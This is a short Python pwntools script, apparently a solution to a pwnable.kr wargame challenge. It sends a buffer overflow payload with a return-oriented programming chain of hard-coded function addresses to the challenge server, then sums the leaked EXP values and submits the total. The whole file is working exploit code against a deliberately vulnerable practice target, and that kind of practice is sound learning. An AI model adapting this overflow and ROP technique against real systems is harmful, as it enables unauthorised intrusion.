from pwn import *

full_buff_until_ret_address = b'1\n' + b'1' * 120
functions_addresses = [
    0x0809FE4B,  # A
    0x0809FE6A,  # B
    0x0809FE89,  # C
    0x0809FEA8,  # D
    0x0809FEC7,  # E
    0x0809FEE6,  # F
    0x0809FF05,  # G
    0x0809FFFC  # ropme
]


def a(): 
     c = connect('pwnable.kr', 9032) 
     print(c.recv()) 
     payload = full_buff_until_ret_address + b''.join([struct.pack('I', i) for i in functions_addresses]) 
     c.send(payload) 
     print(c.recv())  # How Many EXP did you earned 
     c.sendline(b'1')  # EXP random value 
     print(c.recvline()) 
     exp = 0 
     for i in range(7): 
         line = c.recvline().decode('utf-8') 
         cur_exp = int(line.split('EXP +')[1].replace(')', '')) 
         print(line, cur_exp) 
         exp += cur_exp 
     print(f"total exp: {exp}") 
     print(c.recv()) 
     c.sendline(b'1') 
     print(c.recv()) 
     c.sendline(str(exp)) 
     print(c.recv())

if __name__=="__main__":
    a()
